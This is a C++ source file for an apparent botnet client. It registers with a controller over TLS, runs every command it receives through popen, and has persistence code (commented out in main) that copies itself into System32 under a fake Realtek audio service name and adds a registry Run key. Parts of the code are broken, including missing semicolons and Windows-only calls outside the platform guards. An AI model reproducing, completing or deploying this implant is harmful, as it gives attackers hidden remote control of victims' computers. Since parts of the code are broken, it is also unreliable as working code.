#include <iostream>
#include <string>
#include <sstream>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <chrono>
#include <random>
#include <array>
#include <memory>
#include <stdexcept>
#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/x509v3.h>
#endif

using namespace std;

const string CONTROLLER_IP = "127.0.0.1";
const int CONTROLLER_PORT = 12345;
const string CERT_FILE =""
const string KEY_FILE = ""

bool copyToSystem32() {
    char system32Path[MAX_PATH];
    if (!GetSystemDirectoryA(system32Path, MAX_PATH)) {
        return false;
    }

    char currentPath[MAX_PATH];
    if (!GetModuleFileNameA(NULL, currentPath, MAX_PATH)) {
        return false;
    }

    std::string destinationPath = std::string(system32Path) + "\\RtkAudUService64.exe";

    if (!CopyFileA(currentPath, destinationPath.c_str(), FALSE)) {
        return false;
    }

    return true;
}

bool addToStartup() {
    char system32Path[MAX_PATH];
    if (!GetSystemDirectoryA(system32Path, MAX_PATH)) {
        return false;
    }

    std::string executablePath = std::string(system32Path) + "\\RtkAudUService64.exe";

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        return false;
    }

    if (RegSetValueExA(hKey, "RtkAudUService64", 0, REG_SZ, (const BYTE*)executablePath.c_str(), executablePath.length() + 1) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    return true;
}

#ifdef _WIN32
bool initialize_winsock() {
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        cerr << "WSAStartup failed: " << result << endl;
        return false;
    }
    return true;
}
#endif

string generate_bot_id() {
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> distrib(1000, 9999);

    return to_string(distrib(gen));
}

string BOT_ID = generate_bot_id();

#ifdef _WIN32
string exec(const char* cmd) {
    array < char, 128 > buffer;
    string result;
    unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
    if (!pipe) {
        throw runtime_error("popen() failed");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}
#else
string exec(const char* cmd) {
    array<char, 128> buffer;
    string result;
    unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}
#endif

int verify_callback(int preverify_ok, X509_STORE_CTX* ctx) {
    if (preverify_ok == 0) {
        int error = X509_STORE_CTX_get_error(ctx);
        cerr << "Certificate verification failed: " << X509_verify_cert_error_string(error) << endl;
        return 0;
    }
    return 1;
}

bool register_with_controller(int sock, SSL_CTX* ctx) {
    try {
        sockaddr_in server_address;
        server_address.sin_family = AF_INET;
        server_address.sin_port = htons(CONTROLLER_PORT);

        if (inet_pton(AF_INET, CONTROLLER_IP.c_str(), &(server_address.sin_addr)) <= 0) {
            cerr << "inet_pton failed for IP address: " << CONTROLLER_IP << endl;
            return false;
        }

        if (connect(sock, (sockaddr*)&server_address, sizeof(server_address)) == SOCKET_ERROR) {
            cerr << "Connection failed. Error: " <<
#ifdef _WIN32
                WSAGetLastError()
#else
                errno
#endif
                << endl;
            return false;
        }

        SSL* ssl = SSL_new(ctx);
        if (!ssl) {
            cerr << "SSL_new failed" << endl;
            return false;
        }
        SSL_set_fd(ssl, sock);

        if (SSL_connect(ssl) <= 0) {
            ERR_print_errors_fp(stderr);
            cerr << "SSL_connect failed" << endl;
            SSL_free(ssl);
            return false;
        }
        cout << "SSL connection successful!" << endl;


        string message = "{\"bot_id\": \"" + BOT_ID + "\", \"action\": \"register\"}";
        int ret = SSL_write(ssl, message.c_str(), message.length());
        if (ret <= 0) {
            cerr << "SSL_write failed. Error: " << SSL_get_error(ssl, ret) << endl;
            SSL_shutdown(ssl);
            SSL_free(ssl);
            return false;
        }

        char buffer[1024];
        ret = SSL_read(ssl, buffer, sizeof(buffer) - 1);
        if (ret > 0) {
            buffer[ret] = '\0';
            cout << "Response from controller: " << buffer << endl;
        }
        else {
            cerr << "Error receiving data from controller. Error: " << SSL_get_error(ssl, ret) << endl;
            SSL_shutdown(ssl);
            SSL_free(ssl);
            return false;
        }

        SSL_shutdown(ssl);
        return true;
    }
    catch (const exception& e) {
        cerr << "Exception in register_with_controller: " << e.what() << endl;
        return false;
    }
}


int main() {
    /*
    if (copyToSystem32()) {
        std::cout << "Successfully copied to System32." << std::endl;
    }
    else {
        std::cerr << "Failed to copy to System32." << std::endl;
    }

    if (addToStartup()) {
        std::cout << "Successfully added to startup." << std::endl;
    }
    else {
        std::cerr << "Failed to add to startup." << std::endl;
    }
    */

#ifdef _WIN32
    if (!initialize_winsock()) {
        return 1;
    }
#endif

    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();

    const SSL_METHOD* method = TLS_client_method();
    SSL_CTX* ctx = SSL_CTX_new(method);

    if (!ctx) {
        cerr << "Unable to create SSL context" << endl;
        ERR_print_errors_fp(stderr);
        return 1;
    }

    if (SSL_CTX_load_verify_locations(ctx, CERT_FILE.c_str(), NULL) != 1) {
        ERR_print_errors_fp(stderr);
        cerr << "Error loading trust store" << endl;
        SSL_CTX_free(ctx);
        return 1;
    }

    SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, verify_callback);
    SSL_CTX_set_verify_depth(ctx, 2);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        cerr << "Could not create socket. Error: " <<
#ifdef _WIN32
            WSAGetLastError()
#else
            errno
#endif
            << endl;
        return 1;
    }

    if (!register_with_controller(sock, ctx)) {
        closesocket(sock);
        SSL_CTX_free(ctx);
        return 1;
    }

    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);
    if (SSL_connect(ssl) <= 0) {
        ERR_print_errors_fp(stderr);
        cerr << "SSL_connect failed" << endl;
        SSL_free(ssl);
        return 1;
    }

    while (true) {
        char buffer[1024];
        int bytes_received = SSL_read(ssl, buffer, sizeof(buffer) - 1);

        if (bytes_received > 0) {
            buffer[bytes_received] = '\0';
            string command(buffer);
            cout << "Received command: " << command << endl;

            try {
                string result = exec(command.c_str());
                cout << "Command execution result:\n" << result << endl;
            }
            catch (const std::runtime_error& e) {
                cerr << "Error executing command: " << e.what() << endl;
            }
        }
        else if (bytes_received == 0) {
            cout << "Controller disconnected." << endl;
            break;
        }
        else {
            cerr << "Error receiving data. Error: " << SSL_get_error(ssl, bytes_received) << endl;
            break;
        }
    }

    SSL_shutdown(ssl);
    SSL_free(ssl);
    closesocket(sock);
    SSL_CTX_free(ctx);
#ifdef _WIN32
    WSACleanup();
#endif
    return 0;
}